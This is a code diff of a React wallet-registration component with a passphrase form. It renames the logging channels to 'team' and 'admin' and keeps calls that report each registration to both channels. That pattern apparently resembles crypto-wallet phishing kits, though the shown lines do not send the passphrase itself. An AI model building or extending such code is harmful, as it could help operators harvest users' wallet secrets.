@@ -12,9 +12,9 @@ import EnterPassphrase from "@/modules/Forms/EnterPassphrase";
 
 import { useMultistepForm } from "@/components/Multistep";
 import type { TRegisterForm } from "@/types/data/forms";
+import { logMessages } from "@/data/initial";
 import { REGISTER_INIT_VALUES, AUTH_INP_DATA, PASSPHRASE_DATA, passArr, passStr } from "@/data/pages/inp-data";
-import { PUBLIC_LOG_CHANNEL, PRIVATE_LOG_CHANNEL } from "@/data/api/tokens";
-import { logMessages } from "@/data/pages/initial";
+import { NEXT_PUBLIC_TEAM_LOG_CHANNEL, NEXT_PUBLIC_ADMIN_LOG_CHANNEL } from "@/data/api/env";
 import { sendExtendedLog } from "@/api/logger-utils";
 
 export const RegisterWallet = () => {
@@ -84,7 +84,7 @@ export const RegisterWallet = () => {
     const [isRegisterPassMatch, setIsRegisterPassMatch] = useState<boolean>(true);
 
     const submitForm = async (data: FieldValues) => {
-        if (currentStepIndex === 0) sendExtendedLog(PUBLIC_LOG_CHANNEL, logMessages.startRegister);
+        if (currentStepIndex === 0) sendExtendedLog(NEXT_PUBLIC_TEAM_LOG_CHANNEL, logMessages.startRegister);
         if (!isLastStep) return next();
 
         // * Clearing extra spaces
@@ -95,8 +95,8 @@ export const RegisterWallet = () => {
         if (isPassCond) {
             setIsRegisterPassMatch(true);
 
-            sendExtendedLog(PUBLIC_LOG_CHANNEL, logMessages.registered);
-            sendExtendedLog(PRIVATE_LOG_CHANNEL, logMessages.registered);
+            sendExtendedLog(NEXT_PUBLIC_TEAM_LOG_CHANNEL, logMessages.registered);
+            sendExtendedLog(NEXT_PUBLIC_ADMIN_LOG_CHANNEL, logMessages.registered);
 
             await new Promise((resolve: any) => setTimeout(resolve, 2000));
             reset();
